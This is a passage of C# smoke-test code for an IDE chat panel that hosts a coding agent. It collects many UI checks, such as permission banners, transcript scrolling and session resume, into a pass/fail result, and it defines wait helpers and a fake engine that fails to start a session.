                // leaves a clean build, every unit test green, and a popup that draws both lists at once
                // or a strip with nothing lit.
                //
                // AFTER the import phase, and the reason is the reverse of the one that puts the import
                // last. The import's dedupe is asserted against a listing it triggers itself, and its
                // wait is "refresh while the section is empty" - so a phase that filled the section
                // BEFORE it left that loop satisfied on the first look, with rows listed before the
                // session it must dedupe against had been saved. Measured, exactly that: deduped=False
                // with all three of the fake's conversations still offered. Nothing here reads the
                // transcript, which is what the import's own "must be last" note is about.
                // The backend telling the user something (issues #208, #85). The captured FRAMES are
                // pinned by `Console notice-replay` over the real transport; what only the host can
                // show is that the event reaches the transcript, that the backend's own level decides
                // how it is drawn, and that an unknown level renders rather than vanishing - which is
                // the defect the whole path exists to fix, and the one most easily reintroduced by a
                // switch that forgets its default.
                var (gotNotices, noticesDetail) = await VerifyBackendNoticesAsync(vm).ConfigureAwait(true);

                var (gotHistoryTabs, historyTabsDetail) = window.Content is CodeWicket.UI.Views.ChatView tabView
                    ? await VerifyHistoryTabsAsync(vm, window, tabView).ConfigureAwait(true)
                    : (false, "chat view not hosted");

                var pass = completed && gotAssistantText && gotEdit && gotToolDetail && gotSteering && gotHeld && gotMultiRead && gotNamedRead && gotPlanComplete && gotEditDedupe && gotEditRowMenu && gotEditStatus && gotEditCardDetail && gotLiveOutput && gotTestCard && gotBreakpointCard && gotTestJump && gotMarkdown && gotEmojiRoundTrip && gotSyntaxHighlight && gotBacktrackGuard && gotFontInheritance && gotFileLink && gotStreamFollow && gotEmptyWheel && gotTabSwitchFollow && gotCollapseRepin && gotHostedFocus && gotInputResize && gotReleaseMenu && gotZoomFlash && gotUsage && gotUsagePanel && gotMcpPanel && gotMcpNotice && gotLiveSwitch && gotReattach && gotResume && gotSummaryResume && gotPersisted && gotWarmStart && gotWarmFailureReported && gotErrorDetail && gotParallelPermissions && gotPermissionHighlight && gotEditBanner && gotFlaggedPermission && gotToolTrust && gotSessionInfo && gotPermissionCleared && gotImagePaste && gotAddContext && gotRenderCost && gotResolvedTheme && gotRealisation && gotDispatch && gotTypingDots && gotSubagentNesting && gotDrillDown && gotPromptPark && gotLastRowPark && gotPlanStripFollow && gotFileDrop && gotHeaderMenuWired && gotHistoryTabs && gotNotices && gotCliImport;
                exitCode = pass ? 0 : 1;
                result = pass
                    ? $"PASS: mid-turn Enter held across a running tool call then delivered when it finished (call survived); mid-turn steer delivered into the running turn + the raced one recovered; streamed assistant text + host edit ({ide.WrittenFiles.FirstOrDefault()}); tool row enriched in place; multi-file read targets; a generically-titled read row names its file; plan completed via empty update; diff folded into its tool row + re-send deduped (row offers Open file/Copy path, a fileless row doesn't); standalone edit card flips green on completion and offers its detail expander; live command output on the running row; test card deduped + row decluttered + failure row click opens its .feature scenario (menu keeps the throw site); transcript exported as markdown; emoji + task-list clipboard round-trip; fenced code syntax-highlighted + copy intact; assistant markdown inherits the pane typeface; file reference in prose upgrades to a link that opens it; transcript follows streamed text, stops when scrolled up, resumes at the bottom, survives a shrink, a permission banner, a tab switch and a wheel with nothing to scroll; message box resize grip hit-testable + default bounds intact; the release-point pill drops a themed menu naming both modes and marking the one in force; zoom readout flashes the new percentage; usage merged from the mid-turn snapshot + turn totals + panel rows composed; MCP notice + warm-started fresh session (and a failed warm start reports once); backend error detail starts collapsed then renders selectable; live model switch; reopened session resumed full + from-summary; saved session restored+replayed ({store.List(workDir).Count} session(s)); parallel permissions queued+answered; permission highlights+expands its row; edit banner shows intent + native View diff (no raw JSON); flagged command strips always-allow + confirms; an MCP tool can be trusted permanently (another server's keeps its server in the rule); pending permission cleared on session switch; a pasted image lands as a chip, renders and rides its message to disk; a streamed message's render cost reaches the log ({renderCostDetail}); rendered markdown carries resolved theme values rather than per-element resource references; a scroll's realisation cost reaches the log and an assistant message builds no hidden plain-text copy of itself ({realisationDetail}); the dispatcher trace names a real callback on this runtime ({dispatchDetail}); the typing dots animate only while they are shown ({typingDotsDetail}); a sub-agent fan-out is one row until expanded, its children render inside it, and an async launch reports launched rather than succeeded ({subagentDetail}); a 200-call fan-out opens as its own virtualising transcript and Back returns to the row you were reading ({drillDetail}); a pending permission parks the view on its row while following and leaves a scrolled-away reader alone ({promptParkDetail}); a prompt about the LAST row leaves it whole on screen ({lastRowParkDetail}); a dropped file lands in the composer as a path measured from the agent's root, undoable, while text dropped on the box stays the TextBox's ({fileDropDetail}); every item in the header menu is actually wired ({headerMenuDetail}); a conversation from the backend's own CLI is offered once, deduped against the one we already hold, and opens as a live session ({cliImportDetail}). mode={modeName} bannerShown={bannerShown}"
                    : $"FAIL: held={gotHeld} ({heldDetail}) steering={gotSteering} ({steeringDetail}) completed={completed} assistantText={gotAssistantText} edit={gotEdit} toolDetail={gotToolDetail} multiRead={gotMultiRead} (targets={multiRead?.FileTargets.Count}, tip={multiRead?.OpenFileToolTip}, label={multiRead?.TargetDisplayPath}) namedRead={gotNamedRead} (r3Title={genericRead?.Title}, r3Label={genericRead?.TargetDisplayPath}, r3Opens={genericRead?.FilePath}, r3CanOpen={genericRead?.CanOpenFile}, r1Label={readRow?.TargetDisplayPath}) planComplete={gotPlanComplete} (tasks={planCard?.Tasks.Count}, complete={planCard?.IsComplete}, bar={vm.IsPlanBarVisible}) editRowMenu={gotEditRowMenu} ({editRowMenuDetail}) editDedupe={gotEditDedupe} (t1Diff={editTool?.DiffPath}:{editTool?.DiffOldText.Replace("\n", "\\n")}; editRows={vm.Items.OfType<EditItemViewModel>().Count()}; items=[{string.Join(",", vm.Items.Select(i => i.GetType().Name.Replace("ItemViewModel", "") + (i is EditItemViewModel e2 ? ":" + e2.Path : "")))}]) editStatus={gotEditStatus} (cards={editCards.Count}, path={editCards.FirstOrDefault()?.Path}, status={editCards.FirstOrDefault()?.Status}) editCardDetail={gotEditCardDetail} ({editCardDetailDetail}) liveOutput={gotLiveOutput} (c1Out={cmdRow?.OutputDetail?.Replace("\n", "\\n")}) testCard={gotTestCard} breakpointCard={gotBreakpointCard} (cards={breakpointCards.Count}, rows={breakpointCards.FirstOrDefault()?.Rows.Count}, trace={traceRow?.PrintMessage}, failed={failedBreakpoint?.Error?.Substring(0, Math.Min(40, failedBreakpoint.Error.Length))}, rowOut={breakpointRow?.OutputDetail}) testJump={gotTestJump} (testFile={failureRow?.TestFile}, header={failureRow?.OpenTestHeader}, opened={_lastFileOpened}, cards={testCards.Count}, rowOutput={runTestsRow?.OutputDetail?.Substring(0, Math.Min(60, runTestsRow.OutputDetail.Length)).Replace("\n", "\\n")}) markdown={gotMarkdown} (len={markdown.Length}) emojiRoundTrip={gotEmojiRoundTrip} (copy={emojiCopy.Replace("\n", "\\n")}) syntaxHighlight={gotSyntaxHighlight} (runs={codeRuns.Count}, copy={codeCopy.Replace("\n", "\\n")}) backtrackGuard={gotBacktrackGuard} (returned={backtrackReturned}, runs={backtrackRuns}) fontInheritance={gotFontInheritance} (docFamily={assistantDoc?.Document?.FontFamily?.Source}) fileLink={gotFileLink} ({fileLinkDetail}) streamFollow={gotStreamFollow} ({followDetail}) emptyWheel={gotEmptyWheel} ({emptyWheelDetail}) collapseRepin={gotCollapseRepin} ({collapseRepinDetail}) hostedFocus={gotHostedFocus} ({hostedDetail}) tabSwitch={gotTabSwitchFollow} ({tabSwitchDetail}) inputResize={gotInputResize} (grip={grip?.ActualHeight}, cursor={grip?.Cursor}, min={inputBox?.MinHeight}, max={inputBox?.MaxHeight}) releaseMenu={gotReleaseMenu} (opened={menuOpened}, names={menuNamesBoth}, themed={menuIsThemed}, marks={menuMarksTheMode}, changes={menuChangesTheMode}, items={releaseItems.Count}) zoomFlash={gotZoomFlash} (hiddenAtRest={pillHiddenAtRest}, textAtCheck={zoomFlashText}, opacity={zoomPill?.Opacity}) usagePanel={gotUsagePanel} (rows=[{string.Join(", ", usageRows.Select(r => (r.IsSubItem ? "  " : "") + r.Label + "=" + r.Value))}]) usage={gotUsage} (label={vm.ContextLabel}, level={vm.UsageLevel}, detail={usageDetailOneLine}) mcpPanel={gotMcpPanel} (rosterArrived={mcpRosterArrived}, button={mcpButtonPresent}, realised={mcpRealisedRows}/{mcpRows.Count}, badge='{vm.McpPendingLabel}', rows={mcpDetailOneLine}) mcpNotice={gotMcpNotice} warmStart={gotWarmStart} warmFailureReported={gotWarmFailureReported} (notices=[{string.Join(" | ", warmFailNotices.Select(n => n.Kind + ":" + n.Text))}]) errorDetail={gotErrorDetail} ({errorDetailDiag}) liveSwitch={gotLiveSwitch} reattach={gotReattach} ({reattachDetail}) resume={gotResume} summaryResume={gotSummaryResume} persisted={gotPersisted} (u={replayedUser} a={replayedAssistant} e={replayedEdit} es={replayedEditStatus}) parallelPermissions={gotParallelPermissions} ({parallelDetail}) permissionHighlight={gotPermissionHighlight} ({highlightDetail}) editBanner={gotEditBanner} ({editBannerDetail}) flaggedPermission={gotFlaggedPermission} ({flaggedDetail}) toolTrust={gotToolTrust} ({toolTrustDetail}) sessionInfo={gotSessionInfo} ({sessionInfoDetail}) permissionCleared={gotPermissionCleared} ({permissionClearedDetail}) imagePaste={gotImagePaste} ({imagePasteDetail}) addContext={gotAddContext} ({addContextDetail}) renderCost={gotRenderCost} ({renderCostDetail}) resolvedTheme={gotResolvedTheme} ({resolvedThemeDetail}) realisation={gotRealisation} ({realisationDetail}) dispatch={gotDispatch} ({dispatchDetail}) typingDots={gotTypingDots} ({typingDotsDetail}) subagentNesting={gotSubagentNesting} ({subagentDetail}) drillDown={gotDrillDown} ({drillDetail}) promptPark={gotPromptPark} ({promptParkDetail}) lastRowPark={gotLastRowPark} ({lastRowParkDetail}) planStrip={gotPlanStripFollow} ({planStripDetail}) fileDrop={gotFileDrop} ({fileDropDetail}) headerMenu={gotHeaderMenuWired} ({headerMenuDetail}) historyTabs={gotHistoryTabs} ({historyTabsDetail}) notices={gotNotices} ({noticesDetail}) cliImport={gotCliImport} ({cliImportDetail}) items={vm.Items.Count} mode={modeName} bannerShown={bannerShown}";
            }
            catch (Exception ex)
            {
                exitCode = 3;
                result = "FAIL (exception): " + ex;
            }

            File.WriteAllText(resultPath, result);
            Shutdown(exitCode);
        }

        /// <summary>Completes when a permission banner appears, or the turn goes idle, or it times out.</summary>
        private static Task<bool> WaitForPermissionOrIdleAsync(ChatViewModel vm, TimeSpan timeout)
        {
            var tcs = new TaskCompletionSource<bool>();

            void Handler(object? s, System.ComponentModel.PropertyChangedEventArgs e)
            {
                if ((e.PropertyName == nameof(ChatViewModel.HasPendingPermission) && vm.HasPendingPermission) ||
                    (e.PropertyName == nameof(ChatViewModel.IsBusy) && !vm.IsBusy))
                {
                    vm.PropertyChanged -= Handler;
                    tcs.TrySetResult(true);
                }
            }

            vm.PropertyChanged += Handler;
            if (vm.HasPendingPermission || !vm.IsBusy)
            {
                vm.PropertyChanged -= Handler;
                tcs.TrySetResult(true);
            }

            _ = Task.Delay(timeout).ContinueWith(_ =>
            {
                vm.PropertyChanged -= Handler;
                tcs.TrySetResult(false);
            });

            return tcs.Task;
        }

        /// <summary>
        /// Polls a transcript condition on the dispatcher until it holds or the timeout elapses.
        /// Streamed agent events and the prompt RPC's completion are not ordered relative to each
        /// other, so a test asserting on the final transcript waits for that state itself rather
        /// than relying on a scheduling heuristic (a dispatcher yield can still lose the race to a
        /// notification that hasn't reached the dispatcher queue yet).
        /// </summary>
        private static async Task<bool> WaitForTranscriptAsync(Func<bool> condition, TimeSpan timeout)
        {
            var deadline = DateTime.UtcNow + timeout;
            while (!condition())
            {
                if (DateTime.UtcNow > deadline)
                    return false;
                // ConfigureAwait(true): resume on the dispatcher, letting queued events apply between polls.
                await Task.Delay(50).ConfigureAwait(true);
            }
            return true;
        }

        private static Task<bool> WaitUntilIdleAsync(ChatViewModel vm, TimeSpan timeout)
        {
            // The command sets IsBusy=true synchronously; wait for it to fall back to false.
            var tcs = new TaskCompletionSource<bool>();

            void Handler(object? s, System.ComponentModel.PropertyChangedEventArgs e)
            {
                if (e.PropertyName == nameof(ChatViewModel.IsBusy) && !vm.IsBusy)
                {
                    vm.PropertyChanged -= Handler;
                    tcs.TrySetResult(true);
                }
            }

            vm.PropertyChanged += Handler;
            if (!vm.IsBusy && tcs.Task.IsCompleted == false)
            {
                // Already idle before we subscribed (turn finished synchronously).
                vm.PropertyChanged -= Handler;
                tcs.TrySetResult(true);
            }

            _ = Task.Delay(timeout).ContinueWith(_ =>
            {
                vm.PropertyChanged -= Handler;
                tcs.TrySetResult(false);
            });

            return tcs.Task;
        }

        protected override void OnExit(ExitEventArgs e)
        {
            try { _engine?.DisposeAsync().AsTask().Wait(TimeSpan.FromSeconds(2)); }
            catch { /* best effort */ }
            // Queued render-diagnostic lines, same reason as the VSIX's Dispose: they are written off
            // this thread, so the last one is still in flight when the host exits.
            RenderDiagnosticsLog.Flush();
            base.OnExit(e);
        }

        /// <summary>
        /// The real engine with one failure injected: <c>startSession</c> throws. Everything else
        /// delegates, so the view-model still lists providers and builds its picker normally — the
        /// smoke needs a backend that refuses to open (a signed-out CLI) without a signed-out CLI.
        /// </summary>
        private sealed class FailingStartEngine : IEngineConnection
        {
            private readonly IEngineConnection _inner;
            private readonly string _message;

            public FailingStartEngine(IEngineConnection inner, string message)
            {
                _inner = inner;
                _message = message;
            }

            public event Action<AgentEventDto>? AgentEvent
            {
                add => _inner.AgentEvent += value;
                remove => _inner.AgentEvent -= value;
            }

            public event Action<ProviderModelsDto>? ProviderModelsRefreshed
            {
                add => _inner.ProviderModelsRefreshed += value;
                remove => _inner.ProviderModelsRefreshed -= value;
            }

            // A fake with no handshake reports no session, which the panel renders as
            // "no agent session open yet" rather than as absent facts (issue #160).
            public Task<SessionInfoResponse?> SessionInfoAsync(CancellationToken cancellationToken = default)
                => Task.FromResult<SessionInfoResponse?>(null);

            public Task<ListProvidersResponse> ListProvidersAsync(CancellationToken cancellationToken = default) =>
                _inner.ListProvidersAsync(cancellationToken);

            public Task<StartSessionResponse> StartSessionAsync(StartSessionRequest request, CancellationToken cancellationToken = default) =>
                throw new InvalidOperationException(_message);

            public Task<PromptResponse> PromptAsync(string text, IReadOnlyList<PromptAttachmentDto>? attachments = null, CancellationToken cancellationToken = default) =>
                _inner.PromptAsync(text, attachments, cancellationToken);

            public Task CancelAsync(CancellationToken cancellationToken = default) => _inner.CancelAsync(cancellationToken);

            // Delegated like everything else: only startSession is injected, and a session that never
            // opened has nothing to steer anyway — this exists to satisfy the interface, not to be used.
            public Task<SteerResponse> SteerAsync(string text, IReadOnlyList<PromptAttachmentDto>? attachments = null, CancellationToken cancellationToken = default) =>
                _inner.SteerAsync(text, attachments, cancellationToken);

            public Task SetModelAsync(string modelId, CancellationToken cancellationToken = default) =>
                _inner.SetModelAsync(modelId, cancellationToken);

            public Task<ListBackendSessionsResponse> ListBackendSessionsAsync(
                ListBackendSessionsRequest request, CancellationToken cancellationToken = default) =>
                _inner.ListBackendSessionsAsync(request, cancellationToken);

            public Task<TakeImportedHistoryResponse> TakeImportedHistoryAsync(
                TakeImportedHistoryRequest request, CancellationToken cancellationToken = default) =>
                _inner.TakeImportedHistoryAsync(request, cancellationToken);

            public Task<SummarizeResponse> SummarizeAsync(SummarizeRequest request, CancellationToken cancellationToken = default) =>
                _inner.SummarizeAsync(request, cancellationToken);
        }
    }
}
